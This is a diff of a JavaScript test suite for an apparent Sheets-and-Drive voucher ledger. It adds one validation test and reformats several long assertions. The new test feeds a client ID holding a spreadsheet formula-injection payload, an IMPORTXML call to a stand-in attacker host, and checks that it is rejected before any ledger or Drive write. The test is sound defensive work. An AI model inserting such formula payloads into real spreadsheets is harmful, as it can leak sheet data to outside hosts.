@@ -641,6 +641,25 @@ ok(
   }).ok,
   'control character in client ID rejected',
 );
+const rowsBeforeFormulaClientId = g.sheets.Vouchers.rows.length;
+const filesBeforeFormulaClientId = Object.keys(g.files).length;
+const formulaClientId = as(S, 'createVouchers', {
+  entries: [
+    {
+      clientId: '=IMPORTXML("https://attacker.example", "A1")',
+      date: today,
+      vendor: 'Formula ID',
+      amount: 1,
+    },
+  ],
+});
+ok(
+  !formulaClientId.ok &&
+    formulaClientId.code === 'VALIDATION' &&
+    g.sheets.Vouchers.rows.length === rowsBeforeFormulaClientId &&
+    Object.keys(g.files).length === filesBeforeFormulaClientId,
+  'formula-leading client IDs are rejected before ledger or Drive writes',
+);
 const filesBeforeBatchDuplicate = Object.keys(g.files).length;
 const sameRequest = as(S, 'createVouchers', {
   entries: [
@@ -1515,8 +1534,11 @@ const voucherRowAfterPreCommitFailure = g.sheets.Vouchers.rows.find(
 );
 ok(
   !preCommitReceiptFailure.ok &&
-    String(voucherRowAfterPreCommitFailure?.[voucherHeadersBeforeReceiptFailure.indexOf('Receipts')] || '') ===
-      receiptIdsBeforeReceiptFailure &&
+    String(
+      voucherRowAfterPreCommitFailure?.[
+        voucherHeadersBeforeReceiptFailure.indexOf('Receipts')
+      ] || '',
+    ) === receiptIdsBeforeReceiptFailure &&
     Object.keys(g.files).length === filesBeforePreCommitReceiptFailure,
   'a confirmed pre-commit addReceipt failure removes only the unattached Drive file',
 );
@@ -1537,7 +1559,9 @@ const receiptIdsAfterCommitFailure = String(
 )
   .split(',')
   .filter(Boolean);
-const newReceiptIdsAfterCommitFailure = receiptIdsAfterCommitFailure.filter((receiptId) => receiptId !== fid);
+const newReceiptIdsAfterCommitFailure = receiptIdsAfterCommitFailure.filter(
+  (receiptId) => receiptId !== fid,
+);
 ok(
   receiptAfterCommitFailure.ok &&
     receiptIdsAfterCommitFailure.length === 2 &&
@@ -1545,7 +1569,8 @@ ok(
     receiptAfterCommitFailure.data.receipts.includes(newReceiptIdsAfterCommitFailure[0]) &&
     Object.prototype.hasOwnProperty.call(g.files, newReceiptIdsAfterCommitFailure[0]) &&
     Object.keys(g.files).length === receiptCountBeforeAmbiguousAttach + 1,
-  'an ambiguous post-commit addReceipt write is reconciled as success and preserves the linked Drive file',
+  'an ambiguous post-commit addReceipt write is reconciled as success and preserves the linked ' +
+    'Drive file',
 );
 
 // vendors + settings
@@ -2211,7 +2236,8 @@ ok(
       (row) => row.id === 'close-boolean-number-regression',
     ) &&
     !malformedClosePreview.data.readyToClose,
-  'cash-close preview blocks malformed voucher types, unsupported statuses and coerced voucher numbers',
+  'cash-close preview blocks malformed voucher types, unsupported statuses and ' +
+    'coerced voucher numbers',
 );
 const malformedCloseAttempt = as(T, 'createCashClose', {
   date: '2020-01-07',
@@ -2222,7 +2248,8 @@ const malformedCloseAttempt = as(T, 'createCashClose', {
 });
 ok(
   !malformedCloseAttempt.ok && malformedCloseAttempt.code === 'CASH_CLOSE_DATA',
-  'cash close cannot finalize while same-date ledger rows have invalid type, status or voucher number',
+  'cash close cannot finalize while same-date ledger rows have invalid type, status or ' +
+    'voucher number',
 );
 g.sheets.Vouchers.rows.splice(malformedCloseStart, malformedCloseRows.length);
 ok(
